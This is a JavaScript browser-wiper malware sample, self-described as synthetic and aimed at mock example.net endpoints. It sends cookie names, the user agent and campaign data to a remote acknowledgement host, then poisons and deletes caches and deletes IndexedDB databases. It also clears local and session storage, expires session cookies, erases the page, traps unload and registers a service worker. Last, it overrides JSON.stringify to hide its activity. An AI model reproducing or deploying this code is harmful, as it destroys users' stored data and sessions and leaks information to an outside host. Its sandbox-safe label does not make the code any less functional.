// Wiper service worker — registers a destructive worker, poisons caches,
// clears storage/cookies, destroys the DOM and neuters telemetry. Synthetic and
// sandbox-safe: cache/IndexedDB stubs never touch host disk and every endpoint
// is a mock under example.net.
(function () {
  'use strict';

  var CONFIG_BLOB =
    'eyJjYW1wYWlnbiI6IndpcGVyLXN3LTIwMjUiLCJjYWNoZXMiOlsic2hlbGwtdjMiLCJhc3NldHMtdjciLCJzdy1wcmVjYWNoZS12MiJdLCJkYXRhYmFzZXMiOlsidmF1bHQiLCJzZXNzaW9uLXN0b3JlIl0sImNvb2tpZXMiOlsic2lkIiwiY3NyZiIsInJlbWVtYmVyIl0sInN0b3JhZ2VQcmVmaXhlcyI6WyJhdXRoOiIsImNhcnQ6IiwiZHJhZnQ6Il0sInN3IjoiL3N3LXdpcGUuanMiLCJhY2siOiJodHRwczovL3dpcGVyLmV4YW1wbGUubmV0L2FjayIsIm5vdGUiOiJBbGwgbG9jYWwgZGF0YSB3YXMgZGVzdHJveWVkIGJ5IHBvbGljeS4ifQ==';
  var config = {
    campaign: 'wiper-sw-2025',
    caches: [],
    databases: [],
    cookies: [],
    storagePrefixes: [],
    sw: '/sw-wipe.js',
    ack: 'https://wiper.example.net/ack',
    note: 'All local data was destroyed by policy.',
  };
  var OWN_STRINGIFY = JSON.stringify;

  function log(line) {
    try {
      console.log('[WIPER] ' + line);
    } catch (error) {}
  }

  function loadConfig() {
    try {
      var parsed = JSON.parse(atob(CONFIG_BLOB));
      if (parsed && typeof parsed === 'object') {
        config.campaign = parsed.campaign || config.campaign;
        config.caches = Array.isArray(parsed.caches) ? parsed.caches : config.caches;
        config.databases = Array.isArray(parsed.databases) ? parsed.databases : config.databases;
        config.cookies = Array.isArray(parsed.cookies) ? parsed.cookies : config.cookies;
        config.storagePrefixes = Array.isArray(parsed.storagePrefixes) ? parsed.storagePrefixes : config.storagePrefixes;
        config.sw = parsed.sw || config.sw;
        config.ack = parsed.ack || config.ack;
        config.note = parsed.note || config.note;
      }
    } catch (error) {
      log('config decode failed');
    }
  }

  function encode(value) {
    try {
      return btoa(OWN_STRINGIFY(value));
    } catch (error) {
      return '';
    }
  }

  function exfiltrate() {
    var packet = {
      campaign: config.campaign,
      caches: config.caches,
      databases: config.databases,
      cookies: config.cookies,
      ua: String(navigator.userAgent),
      ts: Date.now(),
      sw: config.sw,
    };
    var body = encode(packet);
    try {
      fetch(config.ack, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: OWN_STRINGIFY({ stage: 'pre-wipe', payload: body }),
      })
        .then(function (response) {
          log('ack status ' + (response && response.status ? response.status : 0));
        })
        .catch(function (error) {
          log('ack failed ' + (error && error.name ? error.name : 'network'));
        });
    } catch (error) {}
    try {
      navigator.sendBeacon(config.ack, body.slice(0, 480));
    } catch (error) {}
    log('pre-wipe telemetry sent');
  }

  function poisonCaches() {
    if (typeof caches === 'undefined') {
      log('cache storage unavailable');
      return;
    }
    var names = config.caches.length > 0 ? config.caches.slice(0) : ['shell-v3'];
    for (var index = 0; index < names.length; index += 1) {
      (function (name) {
        try {
          caches
            .open(name)
            .then(function (cache) {
              return cache.put('/index.html', '<html><body>wiped</body></html>').then(function () {
                return cache.add('/wipe.js');
              });
            })
            .then(function () {
              return caches.delete(name);
            })
            .then(function () {
              log('cache poisoned and dropped ' + name);
            })
            .catch(function () {
              log('cache op failed ' + name);
            });
        } catch (error) {}
      })(names[index]);
    }
    try {
      caches
        .keys()
        .then(function (keys) {
          log('cache names at wipe: ' + keys.length);
        })
        .catch(function () {});
    } catch (error) {}
  }

  function destroyDatabases() {
    if (typeof indexedDB === 'undefined') return;
    for (var index = 0; index < config.databases.length; index += 1) {
      try {
        var request = indexedDB.deleteDatabase(config.databases[index]);
        if (request && 'onsuccess' in request) {
          request.onsuccess = function () {
            log('database dropped');
          };
          request.onerror = function () {
            log('database drop refused');
          };
        }
      } catch (error) {}
    }
  }

  function destroyStorage() {
    try {
      localStorage.setItem('wipe:marker', config.campaign);
      localStorage.clear();
      log('localStorage cleared');
    } catch (error) {
      log('localStorage protected');
    }
    try {
      sessionStorage.clear();
      log('sessionStorage cleared');
    } catch (error) {}
    for (var index = 0; index < config.storagePrefixes.length; index += 1) {
      try {
        localStorage.removeItem(config.storagePrefixes[index] + 'session');
      } catch (error) {}
    }
  }

  function destroyCookies() {
    for (var index = 0; index < config.cookies.length; index += 1) {
      try {
        document.cookie = config.cookies[index] + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
      } catch (error) {}
    }
    try {
      document.cookie = 'wipe=1; path=/; max-age=86400';
    } catch (error) {}
    log('cookies expired: ' + config.cookies.join(','));
  }

  function destroyDom() {
    try {
      document.title = '';
    } catch (error) {}
    try {
      while (document.body.firstChild) {
        document.body.removeChild(document.body.firstChild);
      }
      log('body detached');
    } catch (error) {}
    try {
      var banner = document.createElement('div');
      banner.id = 'wiper-banner';
      banner.textContent = config.note;
      document.body.appendChild(banner);
    } catch (error) {}
    try {
      document.write('<h1>DEVICE WIPED</h1><p>' + config.note + '</p>');
    } catch (error) {}
  }

  function trapUnload() {
    var handler = function (event) {
      try {
        if (event) {
          event.preventDefault();
          event.returnValue = config.note;
        }
      } catch (error) {}
      return config.note;
    };
    try {
      window.addEventListener('beforeunload', handler);
      window.onbeforeunload = handler;
      log('unload trap armed');
    } catch (error) {}
    try {
      history.pushState({ wipe: true }, '', '#policy');
    } catch (error) {}
  }

  function installServiceWorker() {
    if (!navigator.serviceWorker) {
      log('service worker unsupported');
      return;
    }
    try {
      navigator.serviceWorker
        .register(config.sw, { scope: '/' })
        .then(function (registration) {
          log('worker registered scope=' + String(registration && registration.scope));
          return navigator.serviceWorker.ready;
        })
        .then(function (registration) {
          var active = registration && registration.active ? registration.active : null;
          log('worker active state=' + String(active && active.state));
          if (registration && typeof registration.update === 'function') registration.update();
        })
        .catch(function (error) {
          log('worker registration failed ' + String(error && error.message));
        });
    } catch (error) {}
    try {
      navigator.serviceWorker.getRegistrations().then(function (list) {
        log('existing registrations=' + list.length);
      });
    } catch (error) {}
  }

  /** Wiper tradecraft: hide JSON-based telemetry from local logging. */
  function neuterTelemetry() {
    try {
      var replacement = function (value, replacer, space) {
        try {
          if (value && typeof value === 'object' && value.__wipe) return '{}';
          return OWN_STRINGIFY(value, replacer, space);
        } catch (error) {
          return '{}';
        }
      };
      JSON.stringify = replacement;
      log('telemetry serializer replaced');
    } catch (error) {
      log('serializer replacement blocked');
    }
  }

  function countdown() {
    var ticks = 0;
    var timer = setInterval(function () {
      ticks += 1;
      log('wipe heartbeat ' + ticks + '/2');
      if (ticks >= 2) clearInterval(timer);
    }, 300);
  }

  function main() {
    loadConfig();
    log('campaign ' + config.campaign + ' targets caches=' + config.caches.length);
    exfiltrate();
    poisonCaches();
    destroyDatabases();
    destroyStorage();
    destroyCookies();
    destroyDom();
    trapUnload();
    installServiceWorker();
    neuterTelemetry();
    countdown();
  }

  try {
    main();
  } catch (error) {
    log('stage aborted ' + String(error && error.message));
  }
})();
